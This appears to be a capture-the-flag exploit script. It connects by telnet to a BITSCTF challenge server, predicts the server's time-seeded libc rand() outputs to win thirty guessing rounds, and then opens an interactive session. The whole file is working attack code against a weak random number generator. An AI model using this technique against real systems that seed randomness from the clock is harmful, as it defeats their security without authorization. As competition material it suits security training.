from ctypes import *
from telnetlib import Telnet


def exploit(tn):
    
    libc = CDLL("libc.so.6")
    time = libc.time()
    libc.srand(time)

    for i in range(0, 30):
        tn.read_until(b'round : ')
        val = libc.rand() & 15
        tn.write(str(val).encode() + b'\n')

        
    tn.interact()

def main():
    tn = Telnet('bitsctf.bits-quark.org', 1335)
    exploit(tn)



if __name__ == '__main__':
    main()
